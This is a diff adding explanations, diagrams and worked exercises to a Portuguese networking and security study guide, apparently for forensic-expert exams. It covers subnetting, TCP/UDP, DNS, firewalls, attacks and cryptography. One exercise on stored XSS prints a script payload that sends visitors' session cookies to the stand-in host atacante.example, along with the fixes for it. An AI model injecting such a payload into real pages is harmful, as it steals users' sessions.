@@ -2,6 +2,25 @@
 
 <h2>Modelo OSI x TCP/IP</h2>
 <p>O <strong>modelo OSI</strong> (ISO) é uma referência teórica de 7 camadas. O <strong>modelo TCP/IP</strong> é o que a internet usa de fato e costuma ser apresentado com 4 camadas (algumas bancas usam uma versão híbrida de 5, separando física e enlace).</p>
+<p><strong>Por que dividir em camadas?</strong> Mandar dados de um computador a outro envolve problemas muito diferentes: transformar bits em sinal elétrico, entregar o quadro ao vizinho certo, achar o caminho até outra rede, garantir que nada se perca e, por fim, entender o que a aplicação pediu. Em vez de um programa gigante que faz tudo, cada camada resolve <strong>um</strong> problema e confia que a camada de baixo resolve o dela. Assim dá para trocar o cabo por Wi-Fi sem mexer no navegador, ou trocar HTTP por SSH sem mexer no roteador.</p>
+<p>Na prática isso acontece por <strong>encapsulamento</strong>: ao enviar, cada camada pega o que veio de cima e acrescenta o seu cabeçalho, como quem coloca uma carta dentro de um envelope e o envelope dentro de um malote. Ao receber, o caminho é o inverso: cada camada retira o seu cabeçalho e entrega o resto para cima. É por isso que a unidade de dados muda de nome (segmento, pacote, quadro): o conteúdo é o mesmo, mas o "envelope" externo é outro.</p>
+<figure class="figura"><svg viewBox="0 0 320 160" width="320" role="img" aria-label="Encapsulamento: os dados recebem cabeçalho TCP, depois IP, depois cabeçalho e trailer Ethernet">
+<text x="4" y="29" class="f-nota">Aplicação</text>
+<text x="4" y="65" class="f-nota">Transporte</text>
+<text x="4" y="101" class="f-nota">Rede</text>
+<text x="4" y="137" class="f-nota">Enlace</text>
+<rect x="200" y="14" width="70" height="22" class="f-area f-linha"/><text x="235" y="29" text-anchor="middle" class="f-nota">Dados</text>
+<rect x="160" y="50" width="40" height="22" class="f-fundo f-linha"/><text x="180" y="65" text-anchor="middle" class="f-nota">TCP</text>
+<rect x="200" y="50" width="70" height="22" class="f-area f-linha"/><text x="235" y="65" text-anchor="middle" class="f-nota">Dados</text>
+<rect x="120" y="86" width="40" height="22" class="f-fundo f-linha"/><text x="140" y="101" text-anchor="middle" class="f-nota">IP</text>
+<rect x="160" y="86" width="40" height="22" class="f-fundo f-linha"/><text x="180" y="101" text-anchor="middle" class="f-nota">TCP</text>
+<rect x="200" y="86" width="70" height="22" class="f-area f-linha"/><text x="235" y="101" text-anchor="middle" class="f-nota">Dados</text>
+<rect x="80" y="122" width="40" height="22" class="f-fundo f-linha"/><text x="100" y="137" text-anchor="middle" class="f-nota">Eth</text>
+<rect x="120" y="122" width="40" height="22" class="f-fundo f-linha"/><text x="140" y="137" text-anchor="middle" class="f-nota">IP</text>
+<rect x="160" y="122" width="40" height="22" class="f-fundo f-linha"/><text x="180" y="137" text-anchor="middle" class="f-nota">TCP</text>
+<rect x="200" y="122" width="70" height="22" class="f-area f-linha"/><text x="235" y="137" text-anchor="middle" class="f-nota">Dados</text>
+<rect x="270" y="122" width="36" height="22" class="f-fundo f-linha"/><text x="288" y="137" text-anchor="middle" class="f-nota">FCS</text>
+</svg><figcaption>Encapsulamento: cada camada acrescenta seu cabeçalho (o Ethernet também põe um trailer, o FCS, para detectar erros)</figcaption></figure>
 <table>
 <tr><th>OSI</th><th>TCP/IP</th><th>Unidade de dados</th><th>Protocolos e equipamentos típicos</th></tr>
 <tr><td>7 Aplicação</td><td rowspan="3">Aplicação</td><td rowspan="3">Mensagem / dados</td><td rowspan="3">HTTP, HTTPS, DNS, SMTP, POP3, IMAP, FTP, SSH, Telnet, DHCP, SNMP. TLS costuma ser associado à camada de apresentação/sessão no OSI.</td></tr>
@@ -17,8 +36,23 @@
 <div class="caixa pegadinha"><span class="rotulo">Pegadinha</span>
 <p>O <strong>ARP</strong> traduz endereço IP em endereço MAC dentro da rede local. Ele fica na fronteira entre rede e enlace; a banca pode aceitar qualquer das duas classificações, mas nunca camada de transporte. O ICMP (usado pelo <code>ping</code>) é da camada de rede, não de aplicação.</p></div>
 
+<details class="exemplo"><summary>Um usuário consegue fazer <code>ping 8.8.8.8</code>, mas o navegador não abre nenhum site pelo nome. Em que camada está o problema mais provável?</summary>
+<div class="resolucao">
+<p class="passo">O ping por IP funcionou: há sinal físico, o quadro chega ao roteador e o pacote vai e volta pela internet. As camadas física, de enlace e de rede estão funcionando.</p>
+<p class="passo">O que falha é transformar o nome (www…) em endereço IP. Esse serviço é o DNS, protocolo da camada de aplicação.</p>
+<p class="resposta-final">Resposta: camada de aplicação, provável falha de DNS (servidor DNS errado ou fora do ar). Teste: <code>nslookup</code> do nome, ou acessar o site direto pelo IP.</p></div></details>
+<details class="exemplo"><summary>Item: "O roteador encaminha pacotes com base no endereço MAC de destino, que permanece o mesmo do início ao fim do trajeto." Certo ou errado?</summary>
+<div class="resolucao">
+<p class="passo">O roteador é equipamento da camada 3: decide o caminho olhando o <strong>endereço IP de destino</strong> e sua tabela de roteamento.</p>
+<p class="passo">O MAC só vale dentro de cada enlace. A cada salto, o roteador retira o quadro antigo e monta um novo, com o MAC de origem dele e o MAC do próximo salto. O IP de origem e de destino segue o mesmo (salvo quando há NAT).</p>
+<p class="resposta-final">Resposta: errado nas duas partes. Roteador usa IP; o MAC muda a cada salto, o IP não.</p></div></details>
+<div class="caixa pegadinha"><span class="rotulo">Erro comum</span>
+<p>Achar que o hub "sabe" para quem é o quadro. O hub só repete o sinal para todas as portas (camada 1). Quem aprende os endereços MAC e encaminha só para a porta certa é o switch (camada 2). Por isso, numa rede com hub, qualquer máquina consegue capturar o tráfego das outras.</p></div>
+
 <h2>Endereçamento IPv4, sub-redes, NAT e IPv6</h2>
 <p>Um endereço IPv4 tem <strong>32 bits</strong>, escritos em 4 octetos decimais (0 a 255). A máscara separa a parte de rede da parte de host. Na notação <strong>CIDR</strong>, <code>/24</code> significa 24 bits de rede.</p>
+<p><strong>Por que existe máscara?</strong> O roteador não guarda a localização de cada computador do mundo; ele guarda rotas para <strong>redes</strong>. A máscara diz até onde vai o "nome da rua" (parte de rede) e onde começa o "número da casa" (parte de host). Dois computadores com a mesma parte de rede conversam direto, pelo switch; se a parte de rede for diferente, o pacote precisa ir para o gateway (roteador). Tecnicamente, o computador descobre a rede fazendo um <strong>E lógico (AND)</strong> bit a bit entre o endereço e a máscara.</p>
+<p>E por que se tiram 2 endereços na conta de hosts? Porque, dentro de cada bloco, o <strong>primeiro</strong> endereço (todos os bits de host em 0) identifica a própria rede e o <strong>último</strong> (todos os bits de host em 1) é o broadcast, que fala com todos de uma vez. Nenhum dos dois pode ir para uma máquina.</p>
 <h3>Classes (histórico, ainda cobrado)</h3>
 <table>
 <tr><th>Classe</th><th>1º octeto</th><th>Máscara padrão</th><th>Uso</th></tr>
@@ -56,11 +90,37 @@
 <p class="passo">Precisamos de h bits de host com 2<sup>h</sup> − 2 ≥ 1.000. 2<sup>9</sup> − 2 = 510 (não serve); 2<sup>10</sup> − 2 = 1.022 (serve).</p>
 <p class="passo">Prefixo = 32 − 10 = 22.</p>
 <p class="resposta-final">Resposta: /22 (máscara 255.255.252.0), com 1.022 hosts por sub-rede.</p></div></details>
+<details class="exemplo"><summary>Os hosts 192.168.1.10/26 e 192.168.1.70/26 conseguem se comunicar sem passar por um roteador?</summary>
+<div class="resolucao">
+<p class="passo">/26 → último octeto da máscara 192. Número mágico: 256 − 192 = 64. Blocos: 0 a 63, 64 a 127, 128 a 191, 192 a 255.</p>
+<p class="passo">O .10 está no bloco 192.168.1.0 (de .0 a .63). O .70 está no bloco 192.168.1.64 (de .64 a .127).</p>
+<p class="resposta-final">Resposta: não. Estão em sub-redes diferentes; a comunicação precisa passar pelo gateway (roteador), mesmo que os dois estejam ligados no mesmo switch.</p></div></details>
+<figure class="figura"><svg viewBox="0 0 320 140" width="320" role="img" aria-label="Faixa de 0 a 256 dividida em quatro blocos de 64; o ponto .10 está no primeiro bloco e o .70 no segundo">
+<text x="160" y="22" text-anchor="middle" class="f-titulo">192.168.1.0 dividida em /26</text>
+<rect x="20" y="60" width="70" height="36" class="f-area f-linha"/>
+<rect x="90" y="60" width="70" height="36" class="f-fundo f-linha"/>
+<rect x="160" y="60" width="70" height="36" class="f-fundo f-linha"/>
+<rect x="230" y="60" width="70" height="36" class="f-fundo f-linha"/>
+<circle cx="30.9" cy="78" r="5" class="f-ponto"/><text x="30.9" y="52" text-anchor="middle" class="f-nota">.10</text>
+<circle cx="96.6" cy="78" r="5" class="f-ponto"/><text x="96.6" y="52" text-anchor="middle" class="f-nota">.70</text>
+<text x="20" y="114" text-anchor="middle" class="f-nota">0</text>
+<text x="90" y="114" text-anchor="middle" class="f-nota">64</text>
+<text x="160" y="114" text-anchor="middle" class="f-nota">128</text>
+<text x="230" y="114" text-anchor="middle" class="f-nota">192</text>
+<text x="300" y="114" text-anchor="middle" class="f-nota">256</text>
+</svg><figcaption>Com /26, cada bloco tem 64 endereços: .10 e .70 caem em blocos (sub-redes) diferentes</figcaption></figure>
+<div class="caixa pegadinha"><span class="rotulo">Erro comum</span>
+<p>Esquecer o "−2" (ou aplicá-lo na quantidade de sub-redes). O −2 vale para <strong>hosts</strong> de cada sub-rede. Um /30 tem 4 endereços e só 2 hosts úteis, por isso é usado em enlaces ponto a ponto entre dois roteadores.</p></div>
 <h3>NAT</h3>
 <p>O <strong>NAT</strong> (Network Address Translation) troca o endereço privado de origem por um endereço público no roteador de borda. Na forma mais comum, o <strong>PAT/NAPT</strong> (NAT com sobrecarga), vários hosts compartilham um único IP público, diferenciados pela porta de origem. O NAT ajudou a adiar o esgotamento do IPv4. Na perícia, isso explica por que um IP público em um registro de acesso pode corresponder a vários usuários: é preciso o IP <strong>e a porta lógica de origem</strong>, com data, hora e fuso, para individualizar a conexão (situação típica de CGNAT em provedores).</p>
 <div class="caixa pegadinha"><span class="rotulo">Pegadinha</span>
 <p>NAT não é mecanismo de segurança por si só, embora esconda a topologia interna. Quem filtra tráfego é o firewall.</p></div>
 
+<details class="exemplo"><summary>Um site foi acessado de forma criminosa a partir do IP público 200.150.10.20, às 14h03min27s (UTC−3). O provedor informa que, nesse horário, o IP era compartilhado por centenas de clientes (CGNAT). O que pedir?</summary>
+<div class="resolucao">
+<p class="passo">Com NAT de sobrecarga, o provedor diferencia os clientes pela <strong>porta lógica de origem</strong> que atribuiu a cada conexão.</p>
+<p class="passo">Logo, a requisição ao site (ou à plataforma) deve trazer IP, <strong>porta de origem</strong>, data, hora com segundos e fuso. Com esses dados o provedor localiza, nos seus registros de tradução, o assinante.</p>
+<p class="resposta-final">Resposta: obter a porta de origem nos registros da aplicação e pedir ao provedor a identificação do assinante que usava o par IP + porta naquele instante. Só o IP não individualiza.</p></div></details>
 <h3>Noções de IPv6</h3>
 <ul>
 <li>Endereço de <strong>128 bits</strong>, escrito em 8 grupos de 4 dígitos hexadecimais separados por dois-pontos.</li>
@@ -73,7 +133,15 @@
 <div class="caixa pegadinha"><span class="rotulo">Pegadinha</span>
 <p><code>2001:db8::1::5</code> é inválido: o <code>::</code> só pode aparecer uma vez, senão não dá para saber quantos grupos cada um representa.</p></div>
 
+<details class="exemplo"><summary>Abrevie corretamente o endereço 2001:0db8:0000:0000:0001:0000:0000:0abc.</summary>
+<div class="resolucao">
+<p class="passo">Tirando zeros à esquerda de cada grupo: 2001:db8:0:0:1:0:0:abc.</p>
+<p class="passo">Há duas sequências de dois grupos zerados. O <code>::</code> só pode substituir <strong>uma</strong> delas. A recomendação (RFC 5952) é usar na primeira quando as sequências têm o mesmo tamanho.</p>
+<p class="resposta-final">Resposta: 2001:db8::1:0:0:abc (a forma 2001:db8:0:0:1::abc também é válida; 2001:db8::1::abc é inválida).</p></div></details>
+
 <h2>Transporte: TCP x UDP</h2>
+<p><strong>Por que dois protocolos?</strong> O IP só tenta entregar o pacote; ele pode se perder, chegar duplicado ou fora de ordem. A camada de transporte decide quanto esforço gastar para consertar isso. O <strong>TCP</strong> faz tudo: numera os bytes, espera confirmação, retransmite o que sumiu e reordena. Isso custa tempo e cabeçalho maior. O <strong>UDP</strong> só acrescenta portas e um checksum e manda. Para baixar um laudo, um byte perdido estraga o arquivo, então vale esperar (TCP). Numa chamada de voz, um pedaço de áudio que chega meio segundo atrasado já não serve; é melhor perder do que esperar (UDP).</p>
+<p>A outra função da camada de transporte é a <strong>porta</strong>. O IP leva o pacote até a máquina; a porta diz para qual programa dentro dela. O par IP + porta forma o <strong>socket</strong>. O servidor escuta numa porta conhecida (443, 22…) e o cliente usa uma porta alta temporária (porta efêmera), escolhida pelo sistema.</p>
 <table>
 <tr><th>TCP</th><th>UDP</th></tr>
 <tr><td>Orientado a conexão</td><td>Sem conexão</td></tr>
@@ -88,6 +156,19 @@
 <li>Servidor responde <strong>SYN-ACK</strong>.</li>
 <li>Cliente responde <strong>ACK</strong>. A conexão está estabelecida.</li>
 </ol>
+<figure class="figura"><svg viewBox="0 0 320 170" width="320" role="img" aria-label="Three-way handshake: o cliente envia SYN, o servidor responde SYN-ACK e o cliente responde ACK">
+<defs><marker id="seta-hs" viewBox="0 0 8 8" refX="8" refY="4" markerWidth="8" markerHeight="8" orient="auto"><path d="M0,0 L8,4 L0,8 z" class="f-ponto"/></marker></defs>
+<text x="70" y="22" text-anchor="middle" class="f-titulo">Cliente</text>
+<text x="250" y="22" text-anchor="middle" class="f-titulo">Servidor</text>
+<line x1="70" y1="32" x2="70" y2="165" class="f-eixo"/>
+<line x1="250" y1="32" x2="250" y2="165" class="f-eixo"/>
+<line x1="70" y1="50" x2="250" y2="75" class="f-dest" marker-end="url(#seta-hs)"/>
+<text x="160" y="52" text-anchor="middle">SYN</text>
+<line x1="250" y1="90" x2="70" y2="115" class="f-dest" marker-end="url(#seta-hs)"/>
+<text x="160" y="92" text-anchor="middle">SYN-ACK</text>
+<line x1="70" y1="130" x2="250" y2="155" class="f-dest" marker-end="url(#seta-hs)"/>
+<text x="160" y="132" text-anchor="middle">ACK</text>
+</svg><figcaption>Três segmentos para abrir a conexão; só depois do ACK os dados começam a fluir</figcaption></figure>
 <p>O encerramento normal usa <strong>FIN</strong> e ACK nos dois sentidos (quatro segmentos). O <strong>RST</strong> aborta a conexão.</p>
 <h3>Portas conhecidas (0 a 1023 são as "bem conhecidas")</h3>
 <table>
@@ -105,7 +186,24 @@
 <div class="caixa dica"><span class="rotulo">Dica: SYN flood</span>
 <p>O ataque SYN flood explora o handshake: o atacante envia muitos SYN e não completa com ACK, esgotando a tabela de conexões semiabertas do servidor. Uma defesa clássica são os SYN cookies.</p></div>
 
+<details class="exemplo"><summary>Numa máquina apreendida, o comando <code>netstat -an</code> mostra: <code>TCP 10.0.0.5:51544 → 203.0.113.7:443 ESTABLISHED</code>. O que se conclui?</summary>
+<div class="resolucao">
+<p class="passo">A porta local 51544 é alta, típica de porta efêmera: a máquina 10.0.0.5 é o <strong>cliente</strong>. A porta remota 443 indica um servidor <strong>HTTPS</strong>.</p>
+<p class="passo">ESTABLISHED significa que o three-way handshake foi concluído e a conexão estava ativa no momento da coleta. O IP 10.0.0.5 é privado, então na internet essa conexão apareceu com o IP público do NAT.</p>
+<p class="resposta-final">Resposta: a máquina mantinha uma conexão HTTPS ativa com o servidor 203.0.113.7. Por ser informação volátil, ela se perde se a máquina for desligada antes da coleta.</p></div></details>
+<details class="exemplo"><summary>Para cada serviço, escolha TCP ou UDP: (a) envio de um laudo por SFTP; (b) videochamada; (c) consulta DNS comum; (d) acesso remoto por RDP.</summary>
+<div class="resolucao">
+<p class="passo">(a) SFTP roda sobre SSH, porta 22 TCP: o arquivo não pode chegar com falhas.</p>
+<p class="passo">(b) Videochamada: tempo real, tolera perda, usa UDP (com protocolos como RTP por cima).</p>
+<p class="passo">(c) Consulta DNS comum: pergunta e resposta curtas, UDP 53 (TCP 53 em respostas grandes e transferência de zona).</p>
+<p class="passo">(d) RDP: porta 3389 TCP (versões novas também podem usar UDP para acelerar a imagem, mas a referência de prova é TCP 3389).</p>
+<p class="resposta-final">Resposta: (a) TCP, (b) UDP, (c) UDP, (d) TCP.</p></div></details>
+<div class="caixa pegadinha"><span class="rotulo">Erro comum</span>
+<p>Dizer que o UDP "não tem verificação de erros". Ele tem um campo de checksum para detectar dados corrompidos (opcional no IPv4, obrigatório no IPv6); o que ele não faz é <strong>recuperar</strong> o erro (não confirma, não retransmite, não reordena).</p></div>
+
 <h2>Aplicação: DNS, HTTP, HTTPS, TLS e VPN</h2>
+<p><strong>A ideia por trás.</strong> Pessoas lembram nomes; computadores roteiam números. O DNS é a "lista telefônica" que liga os dois, e por isso é alvo de ataque: quem falsifica a resposta do DNS manda a vítima para onde quiser sem que ela perceba. Já o HTTP foi criado para trafegar páginas em texto claro; qualquer um no caminho (Wi-Fi público, provedor, atacante em MITM) poderia ler ou alterar. O TLS coloca uma camada de proteção por baixo do HTTP sem mudar o próprio HTTP: o navegador confere quem é o servidor (certificado) e, a partir daí, tudo segue cifrado.</p>
+<p>A VPN segue a mesma lógica num nível mais baixo: em vez de proteger só uma aplicação, ela cria um túnel em que <strong>todo</strong> o tráfego vai cifrado até o concentrador da VPN, como se o computador estivesse dentro da rede da empresa.</p>
 <h3>DNS</h3>
 <p>Traduz nomes em endereços IP, de forma hierárquica e distribuída (raiz → TLD como <code>.br</code> → domínio autoritativo). Registros que mais caem:</p>
 <table>
@@ -139,7 +237,28 @@
 <li>Modo <strong>transporte</strong> protege a carga útil; modo <strong>túnel</strong> encapsula o pacote IP inteiro (típico de VPN entre sites).</li>
 </ul>
 
+<details class="exemplo"><summary>Investigando um e-mail de phishing que imita o domínio <code>exemplo.com.br</code>, o perito quer saber (a) qual servidor recebe os e-mails do domínio e (b) qual nome está associado ao IP 203.0.113.10. Que registros DNS consultar?</summary>
+<div class="resolucao">
+<p class="passo">(a) O servidor de e-mail de um domínio está no registro <strong>MX</strong>: <code>nslookup -type=MX exemplo.com.br</code> ou <code>dig MX exemplo.com.br</code>.</p>
+<p class="passo">(b) Do IP para o nome é a resolução reversa, registro <strong>PTR</strong>: <code>dig -x 203.0.113.10</code>.</p>
+<p class="passo">Vale também olhar o <strong>TXT</strong> do domínio: o SPF lista quais servidores podem enviar e-mail em nome dele, o que ajuda a mostrar que a mensagem foi forjada.</p>
+<p class="resposta-final">Resposta: MX para o servidor de e-mail, PTR para o reverso (e TXT para SPF, DKIM e DMARC).</p></div></details>
+<details class="exemplo"><summary>Ao acessar /admin de um sistema, o perito recebe primeiro 401; depois de fazer login com um usuário comum, recebe 403. O que cada código diz?</summary>
+<div class="resolucao">
+<p class="passo">401 (Unauthorized): o servidor não sabe quem você é. Falta <strong>autenticação</strong>.</p>
+<p class="passo">403 (Forbidden): o servidor sabe quem você é, mas esse usuário não tem <strong>permissão</strong> (autorização) para o recurso.</p>
+<p class="resposta-final">Resposta: 401 = não autenticado; 403 = autenticado, porém sem autorização. Se o recurso não existisse, seria 404.</p></div></details>
+<details class="exemplo"><summary>Um servidor usa uma VPN IPsec com ESP em modo túnel a partir do Wi-Fi de um hotel. O que o administrador do Wi-Fi consegue ver?</summary>
+<div class="resolucao">
+<p class="passo">No modo túnel, o pacote IP original inteiro (com os IPs internos de destino) é cifrado pelo ESP e colocado dentro de um novo pacote endereçado ao concentrador da VPN.</p>
+<p class="passo">O hotel vê apenas o IP do notebook, o IP do concentrador, o volume e os horários do tráfego.</p>
+<p class="resposta-final">Resposta: vê que há uma conexão com o concentrador da VPN, mas não vê os destinos internos nem o conteúdo. Com AH no lugar do ESP, o conteúdo ficaria legível (AH não cifra).</p></div></details>
+<div class="caixa pegadinha"><span class="rotulo">Erro comum</span>
+<p>Achar que o HTTPS esconde tudo. Ele cifra o caminho da URL, os parâmetros, os cabeçalhos e o conteúdo; mas o IP de destino e, em regra, o nome do domínio (pela consulta DNS e pelo campo SNI do TLS) continuam visíveis para quem observa a rede.</p></div>
+
 <h2>Firewall, IDS e IPS</h2>
+<p><strong>Por que tantos mecanismos?</strong> Nenhuma barreira sozinha resolve. O firewall é o porteiro: decide quem entra e quem sai por regras de endereço, porta e protocolo, mas não lê o conteúdo da conversa. O IDS é a câmera: observa tudo e avisa quando vê algo suspeito, mas não age. O IPS é o segurança na porta: fica no caminho e barra o que reconhece como ataque. Essa sobreposição de camadas de proteção se chama <strong>defesa em profundidade</strong>.</p>
+<p>O firewall stateful é mais esperto que o filtro simples porque lembra das conexões. Se um computador interno abriu uma conexão para fora, a resposta é aceita automaticamente; um pacote "de resposta" que chega sem ninguém ter perguntado é descartado. Regras de firewall costumam ser avaliadas <strong>de cima para baixo</strong>, valendo a primeira que casar, e terminam com uma negação geral implícita ou explícita.</p>
 <table>
 <tr><th>Mecanismo</th><th>O que faz</th></tr>
 <tr><td>Filtro de pacotes (stateless)</td><td>Decide pacote a pacote por IP, porta e protocolo, sem lembrar conexões.</td></tr>
@@ -158,7 +277,23 @@
 <div class="caixa pegadinha"><span class="rotulo">Pegadinha</span>
 <p>IDS não bloqueia; quem bloqueia é o IPS. E firewall não substitui antivírus: um anexo malicioso que chega por uma porta permitida (como e-mail) passa pelo filtro de pacotes.</p></div>
 
+<details class="exemplo"><summary>Firewall com as regras, nesta ordem: (1) permitir TCP de qualquer origem para 200.10.0.5 porta 443; (2) permitir TCP de 10.0.0.0/8 para 200.10.0.5 porta 22; (3) negar tudo. O que acontece com uma conexão de 177.1.1.1 para 200.10.0.5:22? E de 10.2.3.4 para 200.10.0.5:22?</summary>
+<div class="resolucao">
+<p class="passo">177.1.1.1 → porta 22: a regra 1 não casa (porta errada); a regra 2 não casa (origem fora de 10.0.0.0/8); a regra 3 casa: negado.</p>
+<p class="passo">10.2.3.4 → porta 22: a regra 1 não casa; a regra 2 casa (origem dentro de 10.0.0.0/8, porta 22): permitido.</p>
+<p class="passo">Se a regra "negar tudo" estivesse em primeiro lugar, tudo seria bloqueado, pois as demais nunca seriam avaliadas.</p>
+<p class="resposta-final">Resposta: a primeira conexão é bloqueada e a segunda é permitida. A ordem das regras importa.</p></div></details>
+<details class="exemplo"><summary>Um IDS por anomalia gerou alerta para o backup noturno (tráfego legítimo, mas volumoso). Um IDS por assinatura não alertou um exploit inédito. Classifique cada caso.</summary>
+<div class="resolucao">
+<p class="passo">Alerta para algo legítimo = <strong>falso positivo</strong> (o sistema disse "ataque" e não era). Típico da detecção por anomalia.</p>
+<p class="passo">Ataque real sem alerta = <strong>falso negativo</strong> (o sistema disse "normal" e era ataque). Típico da assinatura diante de ataque de dia zero, que ainda não tem assinatura.</p>
+<p class="resposta-final">Resposta: o primeiro é falso positivo; o segundo, falso negativo, o mais perigoso dos dois.</p></div></details>
+<div class="caixa pegadinha"><span class="rotulo">Erro comum</span>
+<p>Inverter falso positivo e falso negativo. Pense no exame médico: "positivo" é o sistema dizer que há ataque. Falso positivo = alarme à toa; falso negativo = ataque que passou despercebido.</p></div>
+
 <h2>Ataques e códigos maliciosos</h2>
+<p><strong>A lógica por trás dos ataques.</strong> Quase todo ataque explora uma de duas coisas: uma <strong>confiança indevida</strong> (o usuário confia na mensagem falsa, o servidor confia no dado que o usuário digitou, a rede local confia em qualquer resposta ARP) ou o <strong>esgotamento de um recurso</strong> (banda, memória, conexões). As injeções, como SQLi e XSS, acontecem quando o sistema mistura <strong>dado</strong> com <strong>código</strong>: o texto digitado pelo usuário acaba sendo interpretado como comando SQL ou como script. A defesa, por isso, é sempre separar as duas coisas (parâmetros na consulta, codificação na saída).</p>
+<p>Para classificar o ataque na prova, pergunte qual princípio ele fere: interceptar fere a confidencialidade, alterar fere a integridade, derrubar fere a disponibilidade.</p>
 <table>
 <tr><th>Ataque</th><th>Ideia central</th><th>Defesa típica</th></tr>
 <tr><td>DoS / DDoS</td><td>Esgotar recursos para tirar o serviço do ar (afeta a <strong>disponibilidade</strong>). O DDoS usa muitas origens, em geral uma botnet.</td><td>Filtragem, CDN, mitigação no provedor, limitação de taxa</td></tr>
@@ -184,7 +319,24 @@
 <div class="caixa pegadinha"><span class="rotulo">Pegadinha: XSS x SQLi</span>
 <p>SQL injection ataca o <strong>banco de dados</strong> no servidor. XSS executa script no <strong>navegador do usuário</strong>. Se o item disser que o XSS "executa comandos diretamente no SGBD", está errado.</p></div>
 
+<details class="exemplo"><summary>Num fórum, um usuário publica o comentário abaixo. Todo visitante que abre a página passa a enviar seu cookie de sessão ao atacante. Que ataque é esse e como corrigir?</summary>
+<div class="resolucao">
+<pre><code>&lt;script&gt;new Image().src='https://atacante.example/c?'+document.cookie&lt;/script&gt;</code></pre>
+<p class="passo">O script ficou gravado no servidor e roda no navegador de cada <strong>outra vítima</strong> que vê o comentário: é <strong>XSS armazenado</strong> (persistente).</p>
+<p class="passo">Correção principal: codificar a saída. O servidor deve exibir <code>&amp;lt;script&amp;gt;</code>, que o navegador mostra como texto e não executa. Reforços: cookie de sessão com atributo <code>HttpOnly</code> (o script não consegue lê-lo) e Content Security Policy.</p>
+<p class="resposta-final">Resposta: XSS armazenado, corrigido com codificação da saída, reforçada por HttpOnly e CSP.</p></div></details>
+<details class="exemplo"><summary>Um servidor recebe o anexo <code>boleto.pdf.exe</code>; ao ser aberto, cifra os arquivos, pede resgate em criptomoeda e passa a infectar sozinho outras máquinas pela porta 445 (SMB). Classifique.</summary>
+<div class="resolucao">
+<p class="passo">Disfarçar-se de boleto para ser executado é técnica de <strong>cavalo de troia</strong> (com dupla extensão para enganar o usuário).</p>
+<p class="passo">Cifrar e pedir resgate é <strong>ransomware</strong>. Propagar-se sozinho pela rede explorando uma vulnerabilidade, sem depender de um hospedeiro, é comportamento de <strong>worm</strong> (foi o caso do WannaCry, em 2017, pelo SMB).</p>
+<p class="passo">Princípio atingido: disponibilidade (e confidencialidade, se houver vazamento).</p>
+<p class="resposta-final">Resposta: ransomware com propagação de worm, entregue como cavalo de troia. Defesas: backup offline, atualização (correção do SMB), bloqueio da 445 na borda e conscientização.</p></div></details>
+<div class="caixa pegadinha"><span class="rotulo">Erro comum</span>
+<p>Dizer que o vírus se espalha sozinho pela rede. Quem faz isso é o <strong>worm</strong>. O vírus precisa de um hospedeiro (arquivo ou programa) e de que alguém o execute.</p></div>
+
 <h2>Criptografia simétrica e assimétrica</h2>
+<p><strong>O problema que cada uma resolve.</strong> Na criptografia simétrica, a mesma chave tranca e destranca, como um cadeado com uma só chave copiada para os dois lados. É rápida, mas surge a dúvida: como entregar a cópia da chave ao outro sem que alguém a intercepte no caminho? A assimétrica resolve isso com um par de chaves: a <strong>pública</strong> pode ser espalhada à vontade, como um cadeado aberto que qualquer um pode fechar, e só a <strong>privada</strong>, que nunca sai do dono, abre. O preço é a lentidão, pois as contas matemáticas (fatoração no RSA, curvas no ECC) são pesadas.</p>
+<p>A segurança de uma boa cifra não depende de esconder o algoritmo (AES e RSA são públicos), e sim de manter a chave em segredo e de o espaço de chaves ser grande demais para testar todas (força bruta). Cada bit a mais na chave <strong>dobra</strong> o número de tentativas.</p>
 <table>
 <tr><th></th><th>Simétrica</th><th>Assimétrica</th></tr>
 <tr><td>Chaves</td><td>Uma só chave secreta, compartilhada</td><td>Par: chave pública e chave privada</td></tr>
@@ -204,7 +356,29 @@
 <p class="passo">Assimétrica: um par por pessoa = 10 pares = 20 chaves.</p>
 <p class="resposta-final">Resposta: 45 chaves simétricas ou 20 chaves assimétricas (10 públicas e 10 privadas).</p></div></details>
 
+<details class="exemplo"><summary>Uma mensagem foi cifrada com a cifra de César, deslocando cada letra 3 posições: <code>SHULWR</code>. Decifre e diga por que essa cifra é insegura.</summary>
+<div class="resolucao">
+<p class="passo">É cifra simétrica: a chave (deslocamento 3) serve para cifrar e decifrar. Volte 3 letras: S→P, H→E, U→R, L→I, W→T, R→O.</p>
+<p class="passo">Só existem 25 deslocamentos úteis; testar todos leva segundos (força bruta). Compare: o DES tem 2<sup>56</sup> chaves e já é quebrável; o AES-128 tem 2<sup>128</sup>, ou seja, 2<sup>72</sup> vezes mais que o DES.</p>
+<p class="resposta-final">Resposta: PERITO. A cifra é insegura porque o espaço de chaves é minúsculo.</p></div></details>
+<details class="exemplo"><summary>Ana quer enviar a Bruno um arquivo que só ele possa ler e que comprove que foi ela quem enviou. Quais chaves cada um usa?</summary>
+<div class="resolucao">
+<p class="passo">Prova de autoria: Ana <strong>assina</strong> com a chave <strong>privada de Ana</strong>. Bruno confere com a <strong>pública de Ana</strong>.</p>
+<p class="passo">Sigilo: Ana <strong>cifra</strong> com a chave <strong>pública de Bruno</strong>. Só a <strong>privada de Bruno</strong> decifra.</p>
+<p class="passo">Na prática, o arquivo em si é cifrado com uma chave simétrica aleatória, e só essa chave curta é cifrada com a pública de Bruno (modelo híbrido).</p>
+<p class="resposta-final">Resposta: Ana usa a privada dela e a pública de Bruno; Bruno usa a privada dele e a pública de Ana.</p></div></details>
+<details class="exemplo"><summary>RSA de brinquedo: p = 3, q = 11, e = 3. Ache n, a chave privada d e cifre a mensagem m = 4.</summary>
+<div class="resolucao">
+<p class="passo">n = p × q = 33. φ(n) = (p − 1)(q − 1) = 2 × 10 = 20.</p>
+<p class="passo">d é o inverso de e módulo 20: 3 × d deixa resto 1 na divisão por 20. d = 7, pois 3 × 7 = 21 = 20 + 1.</p>
+<p class="passo">Cifrar: c = m<sup>e</sup> mod n = 4<sup>3</sup> mod 33 = 64 mod 33 = 31. Conferência: 31<sup>7</sup> mod 33 = 4, a mensagem original.</p>
+<p class="resposta-final">Resposta: chave pública (e = 3, n = 33), privada d = 7, texto cifrado 31. No RSA real, p e q têm centenas de dígitos; descobrir d sem conhecê-los exige fatorar n.</p></div></details>
+<div class="caixa pegadinha"><span class="rotulo">Erro comum</span>
+<p>Achar que, por ser "mais moderna", a assimétrica substitui a simétrica. Ela é lenta demais para grandes volumes; na prática, as duas trabalham juntas: assimétrica para trocar a chave e assinar, simétrica para cifrar os dados.</p></div>
+
 <h2>Hash, assinatura digital e certificação</h2>
